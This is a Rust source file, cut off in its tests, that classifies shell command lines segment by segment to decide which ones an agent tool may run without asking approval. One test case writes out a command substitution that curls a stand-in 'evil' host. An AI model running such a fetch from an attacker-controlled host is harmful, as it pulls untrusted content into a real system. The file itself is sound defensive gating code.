//! What a command line does, one segment at a time (issues #15 and
//! #16). A hand-written scanner splits the line the way a shell reads
//! it — quoting first, so `grep -n "a|b"` is one command and not a
//! pipe — into segments at `|`, `||`, `&&`, `&`, `;`, newlines and
//! grouping parens. Each segment is then classified on its own: an
//! allow-list command with no writing flag and no redirection to a
//! file is read-only, `cd` and assignments are harmless, and a line
//! runs without asking only when every one of its segments is.
//!
//! The work is still syntactic and conservative. A command
//! substitution is classified by the same rules, recursively, and
//! anything the scanner cannot make sense of asks. A line that is not
//! all read-only asks once, as its riskiest segment (#16): the worst
//! kind a segment has, the last of the worst, so `git add && git
//! commit && git push` asks as `git push`.

use std::collections::VecDeque;

/// What one segment of a command line is, least to worst. The order is
/// the risk order too: the riskiest segment a line has is the worst
/// kind, the last of the worst.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub(crate) enum Kind {
    /// An allow-list command with no writing flag: `grep -n x file`.
    ReadOnly,
    /// Nothing happens on its own: `cd dir`, an assignment, emptiness.
    Harmless,
    /// Not on any list, or an argument the rules cannot read.
    Unknown,
    /// A writing flag, or a redirection to a file.
    Write,
}

/// What [`classify`] found out about a command line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Classified {
    /// The worst kind any segment has.
    pub kind: Kind,
    /// Every segment is read-only or harmless: the line runs.
    pub allowed: bool,
    /// The allow patterns and grants the segments matched, in order,
    /// distinct — the suffix of the `bash allow-pattern` rule name.
    pub patterns: Vec<String>,
    /// The prefix words of the riskiest asking segment: what "don't
    /// ask again" grants, and the header names. `None` when nothing
    /// asks, empty when the ask is a redirection's.
    pub riskiest: Option<Vec<String>>,
    /// One segment's words as the `bash` row's text (issues #21, #38): the first
    /// substantive segment's — allow-listed or worse than harmless, never a no-op — or
    /// the first segment that has words when nothing is; redirections and a trailing
    /// bare fd fall away. Later substantive segments not behind a pipe add a ` +N`.
    pub main: String,
    /// Two or more segments have words or redirections.
    pub compound: bool,
}

/// A shell word: the text with quotes stripped, and what it hides.
#[derive(Debug, Clone, Default, PartialEq)]
struct Word {
    text: String,
    /// Some part was quoted: a value, never a command word.
    quoted: bool,
    /// An unresolved `$var` or `${...}`.
    var: bool,
    /// The text of every `$(...)` and backtick inside.
    subs: Vec<String>,
    /// A construct in it never closed: the line is not shell, and what
    /// the scanner read off it is not what would run.
    broken: bool,
}

impl Word {
    /// Nothing hides in it: what it says is what runs.
    fn literal(&self) -> bool {
        !self.quoted && !self.var && self.subs.is_empty()
    }

    /// A word an allow prefix stops before ([`crate::rules::prefix_of`]'s
    /// eye): quoted, hiding an expansion, or looking like a value.
    fn value_like(&self) -> bool {
        self.quoted
            || self.var
            || !self.subs.is_empty()
            || self.text.contains(['/', '.', ':', '='])
            || (!self.text.is_empty() && self.text.chars().all(|c| c.is_ascii_digit()))
    }
}

/// A redirection. Reading a file, feeding a heredoc, and duplicating a
/// descriptor change nothing; the rest write.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Redir {
    /// `>`, `>|`, `<>`, `&>`: writes a file.
    Out,
    /// `>>`, `&>>`: appends to a file.
    Append,
    /// `>&` (and `<&`): duplicates a descriptor — unless the target is
    /// not a number, which is the old `> word` spelling.
    Dup,
    /// `<`, `<<`, `<<<`: reads.
    In,
    /// `<(`, `>(`: runs a command.
    Proc,
}

#[derive(Debug, Clone)]
enum Piece {
    Word(Word),
    /// A segment break: `|`, `||`, `&&`, `&`, `;`, `;;`, a newline, or
    /// a grouping paren.
    Sep(Sep),
    Redirect {
        kind: Redir,
        target: Word,
    },
}

/// Which break: a `|` feeds the next command the last one's output, so
/// the next segment is a filter — the same work, not more of it. Every
/// other break (`||`, `&&`, `&`, `;`, `;;`, a newline, a paren) starts
/// work of its own.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Sep {
    Pipe,
    Other,
}

#[derive(Debug, Clone, Default)]
struct Segment {
    words: Vec<Word>,
    redirects: Vec<(Redir, Word)>,
    /// The segment follows a `|`: it reads the previous one's output.
    piped: bool,
}

/// Cap on recursion into nested substitutions; past it, ask.
const MAX_DEPTH: usize = 8;

/// Classify a command line against the allow patterns and the grants
/// (`rules::default_bash_allow` is the usual allow list; grants are the
/// project's allowed prefixes). One pass, no state: the same line
/// always classifies the same.
pub(crate) fn classify(command: &str, allow: &[String], grants: &[String]) -> Classified {
    classify_within(command, allow, grants, 0)
}

fn classify_within(src: &str, allow: &[String], grants: &[String], depth: usize) -> Classified {
    let segs = segments(Scanner::scan(src));
    let occupied = segs
        .iter()
        .filter(|s| !s.words.is_empty() || !s.redirects.is_empty())
        .count();
    let mut kind = Kind::Harmless;
    let mut patterns: Vec<String> = Vec::new();
    let mut riskiest: Option<Vec<String>> = None;
    let mut worst = Kind::ReadOnly;
    // The row's segment (issue #21): the first that is more than
    // harmless — the work, not the `cd` that sets it up. `main` stays
    // empty until one is found, then holds; a later, worse segment is
    // the menu's word for the line, not the row's.
    let mut main = String::new();
    // Segments past the row's own that are work of their own (issue
    // #38): `cargo test && sed -i …` is two things, the row says so.
    // A segment behind a `|` is a filter of the row's output, not
    // more work, so it never counts.
    let mut more = 0usize;
    for seg in &segs {
        let sc = classify_segment(seg, allow, grants, depth);
        kind = kind.max(sc.kind);
        // The riskiest asking segment is the worst kind, the last of
        // the worst.
        if sc.kind > Kind::Harmless && sc.kind >= worst {
            worst = sc.kind;
            riskiest = Some(match sc.sub {
                Some(name) => name,
                None => sc.prefix,
            });
        }
        // `ReadOnly` is the least of the kinds, and `Worst` only ever
        // rises, so an allow-listed command (`cargo test`) folds to
        // Harmless — its `pattern` is the trace that it runs. The row
        // names the first segment that does something, not the `cd`
        // that sets it up. A no-op (`true`, `echo ---`) is nothing to
        // name, even though it is not allow-listed.
        let substantive = (sc.pattern.is_some() || sc.kind > Kind::Harmless) && !is_noop(seg);
        if main.is_empty() {
            if substantive {
                main = segment_text(seg);
            }
        } else if substantive && !seg.piped {
            more += 1;
        }
        if let Some(p) = sc.pattern
            && !patterns.contains(&p)
        {
            patterns.push(p);
        }
    }
    // Nothing does anything (`cd x && true`): the row is the first
    // segment that has words.
    if main.is_empty() {
        main = segs
            .iter()
            .map(segment_text)
            .find(|t| !t.is_empty())
            .unwrap_or_default();
    } else if more > 0 {
        // The row says the line's first work and that other work
        // follows (issue #38): `cargo test +1`.
        main = format!("{main} +{more}");
    }
    Classified {
        kind,
        allowed: kind <= Kind::Harmless,
        patterns,
        riskiest,
        main,
        compound: occupied > 1,
    }
}

/// The segment's words for the `bash` row (issue #21): space-joined,
/// redirections gone, a trailing bare fd (`2` of a `2>&1`) dropped —
/// words that never closed are skipped, for they are not shell.
fn segment_text(seg: &Segment) -> String {
    let mut words: Vec<&str> = seg
        .words
        .iter()
        .filter(|w| !w.broken && !w.text.is_empty())
        .map(|w| w.text.as_str())
        .collect();
    // A bare number on the end of a redirecting segment is a
    // descriptor (`2>&1`): plumbing, not a word.
    if !seg.redirects.is_empty()
        && words
            .last()
            .is_some_and(|w| w.bytes().all(|b| b.is_ascii_digit()))
    {
        words.pop();
    }
    words.join(" ")
}

/// One segment, classified.
#[derive(Debug, Clone)]
struct SegClass {
    kind: Kind,
    /// The allow pattern or grant its command matched.
    pattern: Option<String>,
    /// Its leading words, for `prefix_of`: empty when a redirection
    /// carries the risk, since no command prefix covers that.
    prefix: Vec<String>,
    /// The risk is a substitution's, and this is the substitution's
    /// own riskiest prefix.
    sub: Option<Vec<String>>,
}

/// The worst kind so far, and where it came from.
struct Worst {
    kind: Kind,
    sub: Option<Vec<String>>,
    redirect: bool,
}

impl Worst {
    fn fold(&mut self, kind: Kind, sub: Option<Vec<String>>, redirect: bool) {
        if kind > self.kind {
            self.kind = kind;
            self.sub = sub;
            self.redirect = redirect;
        }
    }

    /// A substitution or a process substitution runs a command of its
    /// own; its classification, and its riskiest prefix if it asks,
    /// are the segment's.
    fn fold_sub(&mut self, inner: &Classified) {
        self.fold(inner.kind, inner.riskiest.clone(), false);
    }
}

fn classify_segment(seg: &Segment, allow: &[String], grants: &[String], depth: usize) -> SegClass {
    let mut w = Worst {
        kind: Kind::Harmless,
        sub: None,
        redirect: false,
    };

    // Redirections: to a file writes; a process substitution runs a
    // command of its own.
    for (kind, target) in &seg.redirects {
        if target.broken {
            w.fold(Kind::Unknown, None, false);
            continue;
        }
        match kind {
            Redir::In => {}
            // `2>&1`: a descriptor, never a file. `>&word` with a word
            // that is not a number is the old `> word` spelling, which
            // writes (issue #15 lists the harmless forms).
            Redir::Dup => {
                let digits = target.literal()
                    && !target.text.is_empty()
                    && target.text.bytes().all(|b| b.is_ascii_digit());
                if !digits {
                    w.fold(redirect_kind(target), None, true);
                }
            }
            Redir::Out | Redir::Append => w.fold(redirect_kind(target), None, true),
            Redir::Proc => fold_sub(&mut w, &target.text, allow, grants, depth),
        }
        for sub in &target.subs {
            fold_sub(&mut w, sub, allow, grants, depth);
        }
    }

    // Every substitution inside a word runs, whatever the word is for;
    // a word that never closed is not shell, and asks.
    for word in &seg.words {
        if word.broken {
            w.fold(Kind::Unknown, None, false);
            continue;
        }
        for sub in &word.subs {
            fold_sub(&mut w, sub, allow, grants, depth);
        }
    }

    // The command, past leading assignments and the control words
    // that only introduce it (`if grep -q x` is grep).
    let rest: Vec<&Word> = seg
        .words
        .iter()
        .skip_while(|w| is_assignment(w) || introduces(w))
        .collect();
    let mut pattern = None;
    if let Some(cmd) = rest.first() {
        if is_control(&rest) {
            // `for s in words`, `case $x in`, `done`: the segment sets
            // a loop up or closes one; its body is a segment of its
            // own.
        } else if !cmd.subs.is_empty() {
            // The command itself is a substitution, folded above.
        } else if cmd.var {
            w.fold(Kind::Unknown, None, false);
        } else if cmd.text == "cd" {
            // Changes the directory: harmless on its own (#15).
        } else if let Some((p, granted)) = match_leading(&rest, allow, grants) {
            if granted {
                // The user allowed these words: consent covers the
                // flags between them, and has covered them since the
                // rule existed. Only a redirection still asks.
                pattern = Some(p);
                w.fold(Kind::ReadOnly, None, false);
            } else if writing_flag(cmd.text.as_str(), &rest) {
                w.fold(Kind::Write, None, false);
            } else if flag_sensitive(cmd.text.as_str(), &rest)
                && rest.iter().any(|a| a.var || !a.subs.is_empty())
            {
                // An argument the rules cannot read may hold one of
                // the writing flags.
                w.fold(Kind::Unknown, None, false);
            } else {
                pattern = Some(p);
                w.fold(Kind::ReadOnly, None, false);
            }
        } else {
            w.fold(Kind::Unknown, None, false);
        }
    }

    let prefix = if w.redirect {
        Vec::new()
    } else {
        prefix_words(&rest)
    };
    SegClass {
        kind: w.kind,
        pattern,
        prefix,
        sub: w.sub,
    }
}

/// `> target`: writing, unless the target is the bin it may go to.
fn redirect_kind(target: &Word) -> Kind {
    if target.literal() && target.text == "/dev/null" {
        Kind::Harmless
    } else {
        Kind::Write
    }
}

/// A substitution, classified; depth is where the asking starts.
fn fold_sub(w: &mut Worst, sub: &str, allow: &[String], grants: &[String], depth: usize) {
    if depth < MAX_DEPTH {
        w.fold_sub(&classify_within(sub, allow, grants, depth + 1));
    } else {
        w.fold(Kind::Unknown, None, false);
    }
}

/// `NAME=value` before the command: the environment for one command,
/// harmless on its own.
fn is_assignment(w: &Word) -> bool {
    if w.quoted || !w.subs.is_empty() {
        return false;
    }
    let Some((name, _)) = w.text.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// The control words that only introduce the command after them:
/// `if grep -q x` runs grep, `then echo done` runs echo, `! grep -q x`
/// runs grep. The introducer itself runs nothing.
fn introduces(w: &Word) -> bool {
    w.literal()
        && matches!(
            w.text.as_str(),
            "if" | "then" | "elif" | "else" | "while" | "until" | "do" | "!"
        )
}

/// The words that set a construct up or close it — `for s in words`,
/// `case $x in`, `select x`, `in`, `done`, `fi`, `esac` — never the
/// command itself; what a construct runs is a segment of its own.
fn is_control(rest: &[&Word]) -> bool {
    rest.first().is_some_and(|w| {
        w.literal()
            && matches!(
                w.text.as_str(),
                "for" | "select" | "case" | "in" | "done" | "fi" | "esac"
            )
    })
}

/// The row's no-ops (issue #38): a `||` guard's `true`, an `echo ---` separator, `sleep`
/// — the line's work is elsewhere. Past assignments/introducers, as `classify_segment` reads.
fn is_noop(seg: &Segment) -> bool {
    let mut rest = seg
        .words
        .iter()
        .skip_while(|w| is_assignment(w) || introduces(w));
    rest.next().is_some_and(|w| {
        w.literal()
            && matches!(
                w.text.as_str(),
                "true" | "false" | ":" | "echo" | "printf" | "set" | "export" | "sleep"
            )
    })
}

/// The first pattern or grant whose words equal the segment's leading
/// words; the allow list first, then the grants.
fn match_leading(rest: &[&Word], allow: &[String], grants: &[String]) -> Option<(String, bool)> {
    allow
        .iter()
        .map(|p| (p, false))
        .chain(grants.iter().map(|p| (p, true)))
        .find_map(|(p, granted)| {
            let words: Vec<&str> = p.split_whitespace().collect();
            (!words.is_empty()
                && words.len() <= rest.len()
                && words
                    .iter()
                    .zip(rest.iter().map(|w| w.text.as_str()))
                    .all(|(pw, w)| pw == &w))
            .then(|| (p.clone(), granted))
        })
}

/// The words an allow prefix is made of: the segment's leading words
/// up to the first that looks like a value. The first word always
/// counts; nothing else does after a value.
fn prefix_words(rest: &[&Word]) -> Vec<String> {
    let mut out = Vec::new();
    for (i, word) in rest.iter().enumerate() {
        if i > 0 && word.value_like() {
            break;
        }
        out.push(word.text.clone());
    }
    out
}

/// The writing flags of the allow list (issue #15): a listed command
/// with one of these modifies something, so it asks after all.
fn writing_flag(command: &str, rest: &[&Word]) -> bool {
    let mut args = rest.iter().skip(1);
    match command {
        "sed" => args.any(|w| {
            let t = &w.text;
            t.starts_with("--in-place")
                || (!t.starts_with("--")
                    && t.starts_with('-')
                    && t.len() > 1
                    && t[1..].contains('i'))
                || (!t.starts_with('-') && sed_script_writes(t))
        }),
        "find" => args.any(|w| {
            let t = w.text.trim_start_matches('-');
            t == "delete"
                || t == "fls"
                || t.starts_with("exec")
                || t.starts_with("ok")
                || t.starts_with("fprint")
        }),
        "sort" => args.any(|w| w.text == "-o" || w.text.starts_with("--output")),
        "awk" => args.any(|w| {
            let t = &w.text;
            t == "-i" || (!t.starts_with('-') && awk_program_writes(t))
        }),
        "git" => match rest.get(1).map(|w| w.text.as_str()) {
            Some("branch") => git_branch_writes(&rest[2..]),
            Some("diff") => rest.iter().skip(2).any(|w| w.text.starts_with("--output")),
            _ => false,
        },
        "gh" if rest.get(1).map(|w| w.text.as_str()) == Some("api") => gh_api_writes(&rest[2..]),
        _ => false,
    }
}

/// `git branch`'s listing forms take no free argument: a name creates a
/// branch, and the flags that write are `-d -D -m -M -c -C`,
/// `--delete`, `--move`, `--copy`, `--set-upstream-to` and
/// `--edit-description`. `--contains`, `--merged` and their kin take a
/// value, which is not a free argument.
fn git_branch_writes(args: &[&Word]) -> bool {
    let mut takes_value = false;
    for w in args {
        let t = w.text.as_str();
        if takes_value {
            takes_value = false;
            continue;
        }
        if matches!(t, "-d" | "-D" | "-m" | "-M" | "-c" | "-C")
            || t.starts_with("--delete")
            || t.starts_with("--move")
            || t.starts_with("--copy")
            || t.starts_with("--set-upstream")
            || t.starts_with("--edit-description")
            || !t.starts_with('-')
        {
            return true;
        }
        takes_value = matches!(
            t,
            "--contains"
                | "--no-contains"
                | "--merged"
                | "--no-merged"
                | "--points-at"
                | "--sort"
                | "--format"
        );
    }
    false
}

/// A sed script can write a file or run a command: `w file`, `W file`
/// and `s/x/y/w file` write; `e cmd` and `s/x/y/e` run a shell
/// command. Those letters count only at a script boundary — starting
/// a command, after `;`, a brace, a delimiter or another flag —
/// followed by a space or the end.
fn sed_script_writes(script: &str) -> bool {
    let s: Vec<char> = script.chars().collect();
    (0..s.len()).any(|i| {
        if !matches!(s[i], 'w' | 'W' | 'e') {
            return false;
        }
        let before = i == 0
            || matches!(
                s[i - 1],
                ';' | '\n'
                    | '{'
                    | '}'
                    | '/'
                    | '|'
                    | ','
                    | '#'
                    | '!'
                    | ':'
                    | 'w'
                    | 'W'
                    | 'e'
                    | 'g'
                    | 'p'
                    | 'i'
                    | 'I'
                    | 'm'
                    | 'M'
                    | 's'
                    | '0'..='9'
            );
        let after = i + 1 == s.len() || s[i + 1].is_whitespace();
        before && after
    })
}

/// An awk program writes through `system(`, a redirection, or a pipe
/// to or from a command. `$1 > 5` comparisons look like redirections
/// and ask too: better one prompt too many than one too few.
fn awk_program_writes(program: &str) -> bool {
    program.contains("system(")
        || program.contains('>')
        || program.contains("| getline")
        || program.contains("| \"")
}

/// `gh api` reads with GET (issue #15). A method that is not GET or
/// HEAD writes; so do fields without a method — gh switches to POST —
/// and `--input`, which uploads a body.
fn gh_api_writes(args: &[&Word]) -> bool {
    let mut method: Option<String> = None;
    let mut fields = false;
    let mut input = false;
    let mut it = args.iter();
    while let Some(w) = it.next() {
        let t = &w.text;
        if t == "-X" || t == "--method" {
            method = it.next().map(|v| v.text.to_uppercase());
        } else if let Some(v) = t.strip_prefix("--method=") {
            method = Some(v.to_uppercase());
        } else if let Some(v) = t.strip_prefix("-X") {
            method = Some(v.to_uppercase());
        } else if t.starts_with("--field")
            || t.starts_with("--raw-field")
            || matches!(t.as_str(), "-f" | "-F")
            || (t.starts_with("-f") || t.starts_with("-F")) && t.len() > 2
        {
            fields = true;
        } else if t == "--input" || t.starts_with("--input=") {
            input = true;
        }
    }
    if input {
        return true;
    }
    match method.as_deref() {
        Some(m) if m != "GET" && m != "HEAD" => true,
        _ => {
            let read = matches!(method.as_deref(), Some("GET") | Some("HEAD"));
            fields && !read
        }
    }
}

/// Commands whose writing flags the rules read closely enough that an
/// argument they cannot read might be one of them.
fn flag_sensitive(command: &str, rest: &[&Word]) -> bool {
    match command {
        "sed" | "find" | "sort" | "awk" => true,
        "git" => matches!(
            rest.get(1).map(|w| w.text.as_str()),
            Some("branch" | "diff")
        ),
        "gh" => rest.get(1).map(|w| w.text.as_str()) == Some("api"),
        _ => false,
    }
}

fn segments(pieces: Vec<Piece>) -> Vec<Segment> {
    let mut segs: Vec<Segment> = Vec::new();
    let mut cur = Segment::default();
    for piece in pieces {
        match piece {
            Piece::Sep(sep) => {
                segs.push(std::mem::take(&mut cur));
                cur.piped = sep == Sep::Pipe;
            }
            Piece::Word(w) => cur.words.push(w),
            Piece::Redirect { kind, target } => cur.redirects.push((kind, target)),
        }
    }
    segs.push(cur);
    segs
}

/// A line the old marker check would have called compound: more than
/// one segment, or a substitution anywhere in it.
pub(crate) fn is_compound(src: &str) -> bool {
    let segs = segments(Scanner::scan(src));
    segs.iter().any(|s| {
        s.words.iter().any(|w| !w.subs.is_empty())
            || s.redirects
                .iter()
                .any(|(k, t)| matches!(k, Redir::Proc) || !t.subs.is_empty())
    }) || segs
        .iter()
        .filter(|s| !s.words.is_empty() || !s.redirects.is_empty())
        .count()
        > 1
}

/// A `bash` row's one segment (issue #21): the words of the segment
/// that carries the line's work — the first that is more than
/// harmless, so a `cd x && cargo test …` setup reads as the test it
/// sets up and `cargo test 2>&1 | grep … | head` reads as
/// `cargo test`. Redirections stay off (`2>&1` is plumbing) and a
/// word that is only a substitution shows nothing; the whole command
/// is the pager's business.
pub fn main_segment(command: &str) -> String {
    classify(command, &crate::rules::default_bash_allow(), &[]).main
}

struct Scanner {
    chars: Vec<char>,
    at: usize,
    out: Vec<Piece>,
    /// Heredocs seen on the line being scanned, waiting for bodies.
    heredocs: VecDeque<(String, bool)>,
}

impl Scanner {
    fn scan(src: &str) -> Vec<Piece> {
        let mut s = Self {
            chars: src.chars().collect(),
            at: 0,
            out: Vec::new(),
            heredocs: VecDeque::new(),
        };
        s.run(None);
        s.out
    }

    /// Lex until the end, or the `)` that closes a substitution
    /// (consumed) when `stop` is set. Returns the index just past the
    /// stop, or `None` at the end of the text.
    fn run(&mut self, stop: Option<char>) -> Option<usize> {
        let mut depth = 0usize;
        while self.at < self.chars.len() {
            let c = self.chars[self.at];
            if let Some(s) = stop {
                if c == s {
                    if depth == 0 {
                        self.at += 1;
                        return Some(self.at);
                    }
                    depth -= 1;
                    self.at += 1;
                    self.out.push(Piece::Sep(Sep::Other));
                    continue;
                }
                if c == '(' {
                    depth += 1;
                    self.at += 1;
                    self.out.push(Piece::Sep(Sep::Other));
                    continue;
                }
            }
            match c {
                '\n' => {
                    self.at += 1;
                    self.out.push(Piece::Sep(Sep::Other));
                    self.skip_heredoc_bodies();
                }
                c if c.is_whitespace() => self.at += 1,
                '|' => {
                    self.at += 1;
                    // `||` is a break; a lone `|` is a pipe.
                    let sep = if self.take_if('|') {
                        Sep::Other
                    } else {
                        Sep::Pipe
                    };
                    self.out.push(Piece::Sep(sep));
                }
                '&' => {
                    self.at += 1;
                    match self.peek() {
                        Some('&') => {
                            self.at += 1;
                            self.out.push(Piece::Sep(Sep::Other));
                        }
                        // &> and &>>: both streams into a file.
                        Some('>') => {
                            self.at += 1;
                            let append = self.take_if('>');
                            let kind = if append { Redir::Append } else { Redir::Out };
                            let target = self.word();
                            self.out.push(Piece::Redirect { kind, target });
                        }
                        _ => self.out.push(Piece::Sep(Sep::Other)),
                    }
                }
                ';' => {
                    self.at += 1;
                    self.take_if(';');
                    self.out.push(Piece::Sep(Sep::Other));
                }
                '(' | ')' => {
                    self.at += 1;
                    self.out.push(Piece::Sep(Sep::Other));
                }
                // A comment starts a word; `a#b` is one word.
                '#' => {
                    while self.at < self.chars.len() && self.chars[self.at] != '\n' {
                        self.at += 1;
                    }
                }
                '<' => self.redirect_in(),
                '>' => self.redirect_out(),
                _ => {
                    let w = self.word();
                    self.out.push(Piece::Word(w));
                }
            }
        }
        None
    }

    /// At `<`: input, a heredoc, a herestring, or a process
    /// substitution.
    fn redirect_in(&mut self) {
        self.at += 1;
        if self.peek() == Some('(') {
            self.at += 1;
            let target = self.sub_word();
            self.out.push(Piece::Redirect {
                kind: Redir::Proc,
                target,
            });
            return;
        }
        if self.peek() == Some('<') {
            self.at += 1;
            let dash = self.take_if('-');
            let delim = self.word();
            if !delim.text.is_empty() {
                self.heredocs.push_back((delim.text.clone(), dash));
            }
            self.out.push(Piece::Redirect {
                kind: Redir::In,
                target: delim,
            });
            return;
        }
        let kind = match self.peek() {
            // <>: opened for reading and writing.
            Some('>') => {
                self.at += 1;
                Redir::Out
            }
            Some('&') => {
                self.at += 1;
                Redir::Dup
            }
            _ => Redir::In,
        };
        let target = self.word();
        self.out.push(Piece::Redirect { kind, target });
    }

    /// At `>`: output, append, a descriptor duplicate, or a process
    /// substitution.
    fn redirect_out(&mut self) {
        self.at += 1;
        if self.peek() == Some('(') {
            self.at += 1;
            let target = self.sub_word();
            self.out.push(Piece::Redirect {
                kind: Redir::Proc,
                target,
            });
            return;
        }
        let kind = match self.peek() {
            Some('&') => {
                self.at += 1;
                Redir::Dup
            }
            // >|: clobbers.
            Some('|') => {
                self.at += 1;
                Redir::Out
            }
            Some('>') => {
                self.at += 1;
                Redir::Append
            }
            _ => Redir::Out,
        };
        let target = self.word();
        self.out.push(Piece::Redirect { kind, target });
    }

    /// After a newline, the bodies of the line's heredocs: data, never
    /// commands, so the scanner steps over each one.
    fn skip_heredoc_bodies(&mut self) {
        while let Some((delim, dash)) = self.heredocs.pop_front() {
            loop {
                let start = self.at;
                while self.at < self.chars.len() && self.chars[self.at] != '\n' {
                    self.at += 1;
                }
                let ended = self.peek() == Some('\n');
                if ended {
                    self.at += 1;
                }
                let line: String = self.chars[start..self.at].iter().collect();
                let line = if dash {
                    line.trim_start_matches('\t')
                } else {
                    line.as_str()
                };
                if line == delim || !ended {
                    break;
                }
            }
        }
    }

    /// One word: quoting resolved into `text`, expansions noted. The
    /// spaces an operator may sit in front of its target are skipped,
    /// so `> /dev/null` and `>/dev/null` read the same.
    fn word(&mut self) -> Word {
        let mut w = Word::default();
        while matches!(self.peek(), Some(' ' | '\t' | '\r')) {
            self.at += 1;
        }
        while let Some(c) = self.peek() {
            match c {
                '\n' | ' ' | '\t' | '\r' | '|' | '&' | ';' | '(' | ')' | '<' | '>' => break,
                '\'' => {
                    w.quoted = true;
                    self.at += 1;
                    while let Some(c) = self.peek() {
                        self.at += 1;
                        if c == '\'' {
                            break;
                        }
                        w.text.push(c);
                    }
                }
                '"' => {
                    w.quoted = true;
                    self.at += 1;
                    while let Some(c) = self.peek() {
                        match c {
                            '"' => {
                                self.at += 1;
                                break;
                            }
                            '\\' => {
                                self.at += 1;
                                match self.peek() {
                                    Some(x @ ('$' | '`' | '"' | '\\')) => {
                                        self.at += 1;
                                        w.text.push(x);
                                    }
                                    // A backslash before a newline glues
                                    // two lines into one.
                                    Some('\n') => self.at += 1,
                                    _ => w.text.push('\\'),
                                }
                            }
                            '$' => self.dollar(&mut w),
                            '`' => self.backtick(&mut w),
                            _ => {
                                self.at += 1;
                                w.text.push(c);
                            }
                        }
                    }
                }
                '\\' => {
                    self.at += 1;
                    match self.peek() {
                        Some('\n') => self.at += 1,
                        Some(x) => {
                            self.at += 1;
                            w.text.push(x);
                        }
                        None => w.text.push('\\'),
                    }
                }
                '$' => self.dollar(&mut w),
                '`' => self.backtick(&mut w),
                _ => {
                    self.at += 1;
                    w.text.push(c);
                }
            }
        }
        w
    }

    /// At `$`: a variable, or a command substitution the classifier
    /// will see into.
    fn dollar(&mut self, w: &mut Word) {
        self.at += 1;
        match self.peek() {
            None => w.text.push('$'),
            Some('(') => {
                self.at += 1;
                let sub = self.sub_word();
                w.broken |= sub.broken;
                w.subs.push(sub.text);
            }
            Some('{') => {
                w.var = true;
                self.at += 1;
                let mut depth = 1usize;
                while depth > 0 {
                    match self.peek() {
                        None => return,
                        Some('}') => {
                            depth -= 1;
                            self.at += 1;
                        }
                        Some('{') => {
                            depth += 1;
                            self.at += 1;
                        }
                        // A substitution inside the braces runs too.
                        Some('$') if self.next_is('(') => {
                            self.at += 2;
                            let sub = self.sub_word();
                            w.broken |= sub.broken;
                            w.subs.push(sub.text);
                        }
                        Some(_) => self.at += 1,
                    }
                }
            }
            Some(c) if c.is_alphanumeric() || c == '_' => {
                w.var = true;
                while matches!(self.peek(), Some(c) if c.is_alphanumeric() || c == '_') {
                    self.at += 1;
                }
            }
            // $?, $#, $$ and friends.
            Some(_) => {
                w.var = true;
                self.at += 1;
            }
        }
    }

    /// A backtick substitution: its text, escapes unread, for the
    /// classifier to recurse into.
    fn backtick(&mut self, w: &mut Word) {
        self.at += 1;
        let start = self.at;
        while let Some(c) = self.peek() {
            match c {
                '\\' => {
                    self.at += 1;
                    if self.at < self.chars.len() {
                        self.at += 1;
                    }
                }
                '`' => break,
                _ => self.at += 1,
            }
        }
        w.subs.push(self.chars[start..self.at].iter().collect());
        if self.peek() == Some('`') {
            self.at += 1;
        } else {
            // Never closed: the line is not shell.
            w.broken = true;
        }
    }

    /// The command inside a `$( ... )` or `<( ... )`: its raw text, as
    /// a word the classifier recurses into.
    fn sub_word(&mut self) -> Word {
        let start = self.at;
        let mark = self.out.len();
        let heredocs = self.heredocs.len();
        let close = self.run(Some(')'));
        self.out.truncate(mark);
        // A heredoc an unclosed substitution leaves pending belongs
        // to it, not to the line it sits in.
        self.heredocs.truncate(heredocs);
        let end = close.map_or(self.chars.len(), |p| p - 1);
        Word {
            text: self.chars[start..end].iter().collect(),
            broken: close.is_none(),
            ..Word::default()
        }
    }

    fn next_is(&self, c: char) -> bool {
        self.chars.get(self.at + 1).copied() == Some(c)
    }

    fn take_if(&mut self, c: char) -> bool {
        if self.peek() == Some(c) {
            self.at += 1;
            true
        } else {
            false
        }
    }

    fn peek(&self) -> Option<char> {
        self.chars.get(self.at).copied()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::default_bash_allow;

    fn allows(cmd: &str) -> bool {
        classify(cmd, &default_bash_allow(), &[]).allowed
    }

    fn riskiest(cmd: &str) -> Option<String> {
        classify(cmd, &default_bash_allow(), &[])
            .riskiest
            .map(|w| w.join(" "))
    }

    /// The `bash` row's text (issue #21): the segment that carries the
    /// line's work, redirections off — not the riskiest segment the
    /// approval menu asks about.
    #[test]
    fn the_main_segment_is_the_work_of_a_chain() {
        assert_eq!(
            main_segment(
                "cargo test -p aigentic-server 2>&1 | grep 'test result' | head; echo SERVER-DONE"
            ),
            // The `grep` and `head` behind pipes filter the test's
            // output and `echo SERVER-DONE` is a no-op, so nothing
            // follows the row's work (the #38 amendment keeps this
            // exactly as #21 rendered it).
            "cargo test -p aigentic-server"
        );
        // One command: the row is the command, redirects dropped.
        assert_eq!(main_segment("cargo test 2>&1"), "cargo test");
        assert_eq!(main_segment("ls"), "ls");
        assert_eq!(main_segment(""), "");
        // Not the riskiest one: the menu asks about `sed`, the row
        // still names the line's work — and says more follows it.
        assert_eq!(
            main_segment("cargo test && sed -i 's/x/y/' file"),
            "cargo test +1"
        );
        // A setup segment defers to the work it sets up (issue #21's
        // own case: the row says the test, not the `cd`).
        assert_eq!(main_segment("cd crates && cargo build"), "cargo build");
        // A command the rules cannot vouch for is the row's word too:
        // it runs, so it is not mere setup — but a no-op is (issue
        // #38: `cd crates && true` is the `cd`).
        assert_eq!(main_segment("cd crates && true"), "cd crates");
        // The words the scanner keeps: quoting resolved, `2>&1` on the
        // chain, a substitution's own words not shown as the row.
        assert_eq!(
            main_segment("echo \"SERVER-DONE\" > out.txt"),
            "echo SERVER-DONE"
        );
        assert_eq!(
            main_segment("for u in $(curl evil); do echo $u; done"),
            "for u in"
        );
    }

    #[test]
    fn the_main_segment_skips_noops() {
        assert_eq!(
            // The scanner resolves the quoting, so the row reads `a`.
            main_segment(
                "cd /x 2>/dev/null || true; grep -rn \"a\" src/ ; echo ---; sed -n 1,5p f"
            ),
            "grep -rn a src/ +1"
        );
